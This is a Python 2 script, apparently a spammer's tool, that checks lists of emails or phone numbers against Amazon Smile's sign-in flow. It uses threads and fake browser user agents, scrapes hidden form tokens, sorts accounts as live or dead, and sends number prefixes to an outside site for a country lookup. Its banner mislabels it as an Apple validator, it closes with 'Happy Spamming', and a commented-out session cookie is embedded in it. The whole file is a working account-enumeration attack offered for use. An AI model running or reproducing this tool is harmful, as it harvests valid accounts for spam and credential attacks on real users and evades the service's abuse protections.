import requests
import Queue as queue
import time
import threading
from datetime import datetime
import sys
import re
from fake_useragent import UserAgent

class jancok():
    #live = 'Access denied. Your account does not have permission to access this application.'
    ua = UserAgent()
    wewe = queue.Queue()
    red = "\033[1;31;40m"
    green = "\033[1;32;40m"
    cyan = "\033[1;36;40m"
    grey = "\033[1;37;40m"
    #Resp = self.cek(mailz)
    def __init__(self):
        print(r"""
            _   _  _   _   ___  ___ _  ___   _____ ___ 
           /_\ | \| | /_\ | _ \/ __| || \ \ / / _ / _ \
          / _ \| .` |/ _ \|   | (__| __ |\ V /\_, \_, /
         /_/ \_|_|\_/_/ \_|_|_\\___|_||_| |_|  /_/ /_/ 
                         Apple Phone Number Validator v5.0 (UPDATE AT 31 May 2019)
                         john.dhoe412@gmail.com
                         https://www.facebook.com/jancoxx412    

                         """)
        #If you using python3 change raw_input to input\
        #self.key = raw_input("[+] Input Your Api key (GSQUAD-xxxx) : ")
        self.mail = raw_input(" [+] Input your file Email list : ")
        self.trit = raw_input(" [+] How Many Thread : ")
        self.clean = raw_input(" [+] Clean Your Result Folder : (y/n) ")
        if self.clean == 'y':
            self.clean_res()
        self.List = len(list(open(self.mail)))


    def clean_res(self):
        try:
            open('result/live.txt','w').close()
            open('result/die.txt','w').close()
        except:
            print ('[+] Cant Clean Result Folder')
            print('[+] Result Folder NotFound')
            pass

    def save_res(self, file, x):
        sep = open(file, 'a')
        sep.write(x)
        sep.close()

    def get_data(self):
        headers = {
        'authority': 'www.amazon.in',
        'upgrade-insecure-requests': '1',
        'user-agent': self.ua.chrome,
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'sec-fetch-site': 'none',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-dest': 'document',
        'accept-language': 'en-US,en;q=0.9,id;q=0.8',
        #'cookie': 'session-id=261-7740146-8915443; ubid-acbin=260-6564313-5336851; x-wl-uid=1scgCdvPQ4dZhNSbAeu6yImljdxaZ8QaVFMOTocs8h5LzpMAdIl4yeAkQFlXMpb7DBzd4Vlx1DYI=; session-token=V+5FbDa60UAsMYtYUQWfpEauCo/7/P/5Xhx2acA4Z4+wD5gpvR/t8kbtXGLfqV71YIp1hj+i8UMNqr0UgntP3RJb6vFy28ND3UIh+iT211JQHWl9Qa8M9pwA7wYac9Lqd2fyyD3Ruz8Vo3sFKnSTuDy2Va3i4UtkZGmISJD2U2dY0CDfp507eHQvHceaDgHDL/GTWF+ubpnKQvC2Z0y3nHonAnAQKc1D; session-id-time=2219440447l; csm-hit=tb:6YF0NBYKCFP3BXEZ1W8S+s-96HG9T1W1WNA5ENDJHWV|1588720530304&t:1588720530304&adb:adblk_no',
        }
        link = 'https://smile.amazon.com/ap/signin/ref=smi_ge2_ul_si_rl?_encoding=UTF8&ie=UTF8&openid.assoc_handle=amzn_smile&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.mode=checkid_setup&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&openid.ns.pape=http%3A%2F%2Fspecs.openid.net%2Fextensions%2Fpape%2F1.0&openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fsmile.amazon.com%2Fgp%2Fcharity%2Fhomepage.html%3Fie%3DUTF8%26newts%3D1%26orig%3DLw%253D%253D'
        s = requests.session()
        r = s.get(link, headers=headers)
        cok = dict(r.cookies)
        r = requests.get(link, headers=headers, cookies=cok)
        apptoken = re.findall(r'<input type="hidden" name="appActionToken" value="(.*?)" />', r.content)
        openid = re.findall(r'<input type="hidden" name="openid.return_to" value="(.*?)" />', r.content)
        previd = re.findall(r'<input type="hidden" name="prevRID" value="(.*?)" />', r.content)
        workflow = re.findall(r'<input type="hidden" name="workflowState" value="(.*?)" />', r.content)
        #open('debug.html','a').write(r.content)
        return apptoken,openid,previd,workflow,cok



    def cek(self,mailz):
        try:
            data = self.get_data()
            apptoken = data[0]
            openid = data[1]
            previd = data[2]
            workflow = data[3]
            cookies = data[4]
            headers = {
                'authority': 'www.amazon.ca',
                'cache-control': 'max-age=0',
                'upgrade-insecure-requests': '1',
                'content-type': 'application/x-www-form-urlencoded',
                'user-agent': self.ua.chrome,
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-user': '?1',
                'sec-fetch-dest': 'document',
                'accept-language': 'en-US,en;q=0.9,id;q=0.8',
            }

            data = {
              'appActionToken': apptoken,
              'appAction': 'SIGNIN_PWD_COLLECT',
              'subPageType': 'SignInClaimCollect',
              'openid.return_to': openid,
              'prevRID': previd,
              'workflowState': workflow,
              'email': mailz,
              'password': '',
              'create': '0',
              #'metadata1': workflow
            }
            r = requests.post('https://smile.amazon.com/ap/signin', headers=headers, data=data, cookies=cookies)
            if 'Robot Check' in r.content:
                return ['unknown','']                
            else:
                if 'We cannot find an account with that mobile number' in r.content:
                    return ['die','']                
                else:  
                    test = re.findall(r'<input type="hidden" name="email" value="(.*?)" id="ap_email"/>', r.content)
                    return ['live',test]
        except:
            raise
        

    def main(self):
        self.count = 0
        while 1:
            self.count+=1
            self.hitung = '{}/{} '.format(str(self.count),str(self.List))
            mailz = self.wewe.get()
            response = self.cek(mailz)
            time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            if response[0] == 'live':
                country =  requests.get('https://dutyinfo.uk/test.php?country='+response[1][0][1:3])
                print( self.green + '[+] GSQUAD AMAZON VALIDATOR  - '+ self.hitung + time + ' - LIVE - ' + mailz +' - Country -' +country.content + ' - code ' +response[1][0][1:3] )
                if country.content == '':
                    self.save_res('result/live/unknown-country.txt', response[1][0]+'\n')
                else:
                    pass
                    self.save_res('result/live/'+country.content+'.txt', response[1][0]+'\n')
            elif response[0] == 'die':
                print( self.red + '[+] GSQUAD AMAZON VALIDATOR  - '+ self.hitung + time + ' - DIE - ' + mailz  )
                self.save_res('result/die/die.txt', mailz+'\n')
            elif response[0] == 'unknown':
                print( self.grey + '[+] GSQUAD AMAZON VALIDATOR - '+ self.hitung + time + ' - UNKNOWN - ' + mailz )
                self.save_res('result/unknown.txt', mailz+'\n')
            else:
                pass
            self.wewe.task_done()
    
    def threads(self):
        try:
            for x in range(int(self.trit)):
                t = threading.Thread(target=self.main)
                t.setDaemon(True)
                t.start()
            for y in open(self.mail, 'r').readlines():
                self.wewe.put(y.strip())
        except:
            raise
        self.wewe.join()

    def kelar(self):
        Lep = len(list(open('result/live.txt')))
        Die = len(list(open('result/die.txt')))
        Unknown = len(list(open('result/unknown.txt')))
        print('')
        print(self.cyan+'================================================================')
        print(self.cyan+'[+] Total List Checked => {}'.format(str(self.List)))
        print(self.cyan+'[+] Total Email Valid => {}'.format(str(Lep)))
        print(self.cyan+'[+] Total Email Die => {}'.format(str(Die)))
        print(self.cyan+'[+] Total Email Unknown => {}'.format(str(Unknown)))
        print(self.cyan+'[+] Happy Spamming :D Ciaaoo')
        print(self.cyan+'================================================================')

kontol = jancok()
kontol.threads()
kontol.kelar()